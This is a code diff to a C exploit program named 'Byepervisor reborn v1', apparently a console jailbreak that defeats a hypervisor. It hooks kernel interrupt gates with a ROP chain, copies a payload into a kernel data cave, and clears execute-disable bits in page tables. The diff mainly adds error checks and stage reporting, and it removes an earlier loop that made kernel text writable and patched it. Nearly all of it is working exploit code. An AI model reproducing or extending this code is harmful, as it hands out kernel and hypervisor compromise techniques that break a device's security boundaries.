@@ -11,6 +11,7 @@
 #include "khook.h"
 #include "util.h"
 #include "paging.h"
+#include "stage_status.h"
 
 #include "break_hv_payload/break_hv.h"
 
@@ -27,6 +28,28 @@
 #define HV_LOADER_PA_PRO          0x8e0800000
 
 uint64_t g_hv_base_pa;
+
+static int read_u64(uint64_t addr, uint64_t *out);
+static int write_u64(uint64_t addr, uint64_t value);
+
+static int arm_saved_hook(khook_t *hook, uint64_t cave)
+{
+  /* Persist the original gate and IST before arming the breakpoint. */
+  if (write_u64(cave + CAVE_SAVE_OFF + 0x00, hook->saved_gate_lo) != 0 ||
+      write_u64(cave + CAVE_SAVE_OFF + 0x08, hook->saved_gate_hi) != 0 ||
+      write_u64(cave + CAVE_SAVE_OFF + 0x10, hook->saved_ist) != 0) {
+    return kh_restore(hook) == 0 ? -20 : -22;
+  }
+
+  if (kh_trigger(hook) != 0)
+    return kh_restore(hook) == 0 ? -23 : -22;
+  if (write_u64(cave + CAVE_STATE_OFF, STATE_ARMED) != 0) {
+    if (kh_disarm(hook) != 0 || kh_restore(hook) != 0)
+      return -22;
+    return -21;
+  }
+  return 0;
+}
 
 static int install_test_hook(int core_id, uint64_t cave)
 {
@@ -62,13 +85,7 @@ static int install_test_hook(int core_id, uint64_t cave)
   ret = kh_install(&hook, &chain);
   if (ret) return ret;
 
-  kh_trigger(&hook);
-
-  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
-  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
-  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
-  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
-  return 0;
+  return arm_saved_hook(&hook, cave);
 }
 
 static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
@@ -98,7 +115,7 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
 
   oracle = kh_user_data_addr(&hook);
   kh_chain_init(&chain, chain_buf, sizeof chain_buf);
-  kh_chain_store(&chain, oracle, COOKIE_VAL);
+  kh_chain_store(&chain, oracle, STAGE_HOOK_FIRED);
 
   kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
   kh_chain_q(&chain, cr3);
@@ -125,35 +142,51 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
   ret = kh_install(&hook, &chain);
   if (ret) return ret;
 
-  kh_trigger(&hook);
-  
-  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
-  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
-  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
-  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
-  return 0;
+  return arm_saved_hook(&hook, cave);
 }
 
-static void uninstall_hook(int core_id, uint64_t cave)
+static int uninstall_hook(int core_id, uint64_t cave)
 {
   khook_t hook;
-  kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
+  if (kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST) != 0)
+    return -1;
   kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
   kh_set_core(&hook, core_id);
-  hook.saved_gate_lo = kread64(cave + CAVE_SAVE_OFF + 0x00);
-  hook.saved_gate_hi = kread64(cave + CAVE_SAVE_OFF + 0x08);
-  hook.saved_ist     = kread64(cave + CAVE_SAVE_OFF + 0x10);
+  if (read_u64(cave + CAVE_SAVE_OFF + 0x00, &hook.saved_gate_lo) != 0 ||
+      read_u64(cave + CAVE_SAVE_OFF + 0x08, &hook.saved_gate_hi) != 0 ||
+      read_u64(cave + CAVE_SAVE_OFF + 0x10, &hook.saved_ist) != 0)
+    return -4;
   hook.installed     = 1;
-  kh_disarm(&hook);
-  kh_restore(&hook);
-  kwrite64(cave + CAVE_STATE_OFF, 0);
+  if (kh_disarm(&hook) != 0)
+    return -2;
+  if (kh_restore(&hook) != 0)
+    return -3;
+  uint64_t cleared = 0;
+  return kwrite(cave + CAVE_STATE_OFF, &cleared, sizeof cleared);
+}
+
+static int read_u64(uint64_t addr, uint64_t *out)
+{
+  *out = 0;
+  return kread(addr, out, sizeof *out);
+}
+
+static int write_u64(uint64_t addr, uint64_t value)
+{
+  return kwrite(addr, &value, sizeof value);
+}
+
+static int write_entry_checked(uint64_t addr, uint64_t value)
+{
+  uint64_t readback;
+  if (!addr || addr == UINT64_MAX || write_u64(addr, value) != 0 ||
+      read_u64(addr, &readback) != 0 || readback != value)
+    return -1;
+  return 0;
 }
 
 int main(void)
 {
-  uint64_t test_val;
-  uint8_t *test_val_bytes;
-
   uint32_t fw;
   uint64_t cave;
   uint64_t oracle;
@@ -168,6 +201,7 @@ int main(void)
   uint64_t pde;
   uint64_t pte;
   uint64_t o;
+  uint64_t cave_state;
 
   printf("[+] Byepervisor reborn v1\n");
 
@@ -178,6 +212,7 @@ int main(void)
   if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
     printf("[!] Undetected firmware, exiting!\n");
     notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
+    return 1;
   }
 
   // The hypervisor loader's base physical address changes depending on if its a regular or a pro unit
@@ -198,31 +233,21 @@ int main(void)
   cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
   oracle = cave + KH_OFF_USER;
 
-  pin_to_core(HOOK_CORE);
+  if (pin_to_core(HOOK_CORE) != 0) {
+    notifyf("Byepervisor Reborn\nCannot pin to hook core");
+    return 1;
+  }
 
   // This is so we can send the same payload after resume to experiment with post-HV hax (or not if we want to debug the resume payload)
 #define DEBUG_MP_STARTUP_PAYLOAD 0
 #if DEBUG_MP_STARTUP_PAYLOAD == 0
-  if (kread64(oracle) != 0) {
-    printf("Hypervisor is already compromised\n");
-    printf("Here's a dump of kernel .text base (xotext defeated)!\n");
-    kHexDump(ktext(0), 0x60);
-
-    printf("Here's a dump of some HV strings (hvcore+0x19830)!\n");
-    kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);
-
-    kwrite64(ktext(8), 0x41414141);
-
-    printf("Edited kernel .text\n");
-    kHexDump(ktext(0), 0x60);
-
-    test_val = kread64(ktext(0));
-    test_val_bytes = (uint8_t *) &test_val;
-    notifyf("Byepervisor - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
-      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
-      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
-
-    return 0;
+  if (read_u64(oracle, &o) != 0) {
+    notifyf("Byepervisor Reborn\nCannot read prior stage state");
+    return 1;
+  }
+  if (o != 0) {
+    notifyf("Byepervisor Reborn\nPrior stage state 0x%lx; refusing to re-arm", o);
+    return 1;
   }
 #endif
 
@@ -256,93 +281,146 @@ int main(void)
 
   sceKernelSleep(1);
 
-  uninstall_hook(HOOK_CORE, cave);
+  if (uninstall_hook(HOOK_CORE, cave) != 0)
+    return 1;
   notifyf("uninstalled test khook\n");
   return 0;
 
 #else // !KHOOK_TEST
 
   // Copy our payload that runs from startup_mp into kernel cave
-  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);
+  if (kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len) != 0) {
+    notifyf("Byepervisor Reborn\nCannot stage AP payload");
+    return 1;
+  }
 
   // Make the physical region executable in guest page tables
   kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
-  kernel_pm_cr3 = kread64(kernel_pmap + 0x28);
+  if (read_u64(kernel_pmap + 0x28, &kernel_pm_cr3) != 0 ||
+      !kernel_pm_cr3 || (kernel_pm_cr3 & 0xfff)) {
+    notifyf("Byepervisor Reborn\nInvalid kernel page-table root");
+    return 1;
+  }
 
   pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
+  if (pml4e_addr == UINT64_MAX || !PDE_FIELD(pml4e, PRESENT)) {
+    notifyf("Byepervisor Reborn\nCarrier PML4 entry missing");
+    return 1;
+  }
   CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
-  kwrite64(pml4e_addr, pml4e);
+  if (write_entry_checked(pml4e_addr, pml4e) != 0)
+    return 1;
 
   pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
+  if (pdpe_addr == UINT64_MAX || !PDE_FIELD(pdpe, PRESENT)) {
+    notifyf("Byepervisor Reborn\nCarrier PDP entry missing");
+    return 1;
+  }
   CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
-  kwrite64(pdpe_addr, pdpe);
+  if (write_entry_checked(pdpe_addr, pdpe) != 0)
+    return 1;
 
   if (PDE_FIELD(pdpe, PS) != 1) {
     pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
+    if (pde_addr == UINT64_MAX || !PDE_FIELD(pde, PRESENT)) {
+      notifyf("Byepervisor Reborn\nCarrier PD entry missing");
+      return 1;
+    }
     CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
-    kwrite64(pde_addr, pde);
+    if (write_entry_checked(pde_addr, pde) != 0)
+      return 1;
 
     if (PDE_FIELD(pde, PS) != 1) {
       pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
+      if (pte_addr == UINT64_MAX || !PDE_FIELD(pte, PRESENT)) {
+        notifyf("Byepervisor Reborn\nCarrier PT entry missing");
+        return 1;
+      }
       CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
-      kwrite64(pte_addr, pte);
+      if (write_entry_checked(pte_addr, pte) != 0)
+        return 1;
     }
   }
 
-  // Disable xotext + enable write on kernel .text pages
-  printf("[+] Disabling xotext + enabling write...\n");
-  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
-    pde_addr = find_pde(kernel_pmap, addr, &pde);
-    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
-      CLEAR_PDE_BIT(pde, XOTEXT);
-      SET_PDE_BIT(pde, RW);
-      kwrite64(pde_addr, pde);
-    }
-
-    pte_addr = find_pte(kernel_pmap, addr, &pte);
-    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
-      CLEAR_PDE_BIT(pte, XOTEXT);
-      SET_PDE_BIT(pte, RW);
-      kwrite64(pte_addr, pte);
-    }
-  }
+  /* Leave kernel text mappings untouched in the first controlled test.
+     A separate read-only check can follow only after AP completion. */
 
   // Install hook on startup_mp hypercall
   printf("[+] Installing hook...\n");
-  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
-    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
-    if (r) {
-      printf("[!] Failed to install hook (likely too large)\n");
-      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
-      return r;
-    }
-
-    printf("[+] Hook installed, enter sleep and resume!\n");
-    notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
-  } else {
-    printf("khook: hook already ARMED (state survived)\n");
+  if (read_u64(cave + CAVE_STATE_OFF, &cave_state) != 0 || cave_state != 0) {
+    notifyf("Byepervisor Reborn\nPrior hook state; refusing to re-arm");
+    return 1;
+  }
+  if (write_u64(oracle, 0) != 0) {
+    notifyf("Byepervisor Reborn\nCannot reset stage state");
+    return 1;
+  }
+  int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
+  if (r) {
+    printf("[!] Hook installation returned %d\n", r);
+    notifyf("[ERROR] Byepervisor Reborn\nHook install error %d; do not enter Rest Mode", r);
+    return r;
   }
 
-  // Poll for resume and hook trigger
-  for (;;) {
-    pin_to_core(HOOK_CORE);
+  printf("[+] Hook installed, enter sleep and resume!\n");
+  notifyf("Byepervisor Reborn\nArmed. Enter Rest Mode manually, then wake.");
 
-    o = kread64(oracle);
-    if (o != 0) {
-      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
+  // Poll for resume and hook trigger
+  uint64_t last_stage = 0;
+  int pending_after_hook = 0;
+  for (;;) {
+    if (pin_to_core(HOOK_CORE) != 0) {
+      notifyf("Byepervisor Reborn\nLost hook-core affinity; do not rerun");
+      return 1;
+    }
+
+    if (read_u64(oracle, &o) != 0) {
+      notifyf("Byepervisor Reborn\nStage read failed");
+      return 1;
+    }
+    if (o != last_stage) {
+      printf("[+] Stage changed: 0x%lx\n", o);
+      last_stage = o;
+      if (o == STAGE_HOOK_FIRED)
+        notifyf("Byepervisor Reborn\nResume hook fired; waiting for AP");
+      else if (o == STAGE_AP_ENTERED)
+        notifyf("Byepervisor Reborn\nAP entered; checking VMCBs");
+    }
+    if (o == STAGE_AP_COMPLETE) {
+      notifyf("Byepervisor Reborn\nAP VMCB stage completed; checking cleanup");
       
       printf("[+] Uninstalling hook\n");
-      uninstall_hook(HOOK_CORE, cave);
+      if (uninstall_hook(HOOK_CORE, cave) != 0) {
+        notifyf("Byepervisor Reborn\nHook cleanup failed; do not rerun");
+        return 1;
+      }
 
-      test_val = kread64(ktext(0));
-      test_val_bytes = (uint8_t *) &test_val;
-      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
-      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
-      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
+      notifyf("Byepervisor Reborn\nAP stage complete; gate/IST restored. XOM untested.");
 
       // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)
 
       return 0;
+    }
+
+    if (o == STAGE_AP_INVALID) {
+      notifyf("Byepervisor Reborn\nAP rejected VMCB layout; checking cleanup");
+      if (uninstall_hook(HOOK_CORE, cave) != 0)
+        notifyf("Byepervisor Reborn\nHook cleanup failed; do not rerun");
+      return 1;
+    }
+
+    if (o != 0 && o != STAGE_HOOK_FIRED && o != STAGE_AP_ENTERED) {
+      notifyf("Byepervisor Reborn\nUnknown stage value 0x%lx", o);
+      return 1;
+    }
+
+    if (o == STAGE_HOOK_FIRED || o == STAGE_AP_ENTERED) {
+      if (++pending_after_hook >= 12) {
+        notifyf("Byepervisor Reborn\nAP completion timed out; checking cleanup");
+        if (uninstall_hook(HOOK_CORE, cave) != 0)
+          notifyf("Byepervisor Reborn\nHook cleanup failed; do not rerun");
+        return 1;
+      }
     }
 
     sceKernelSleep(5);
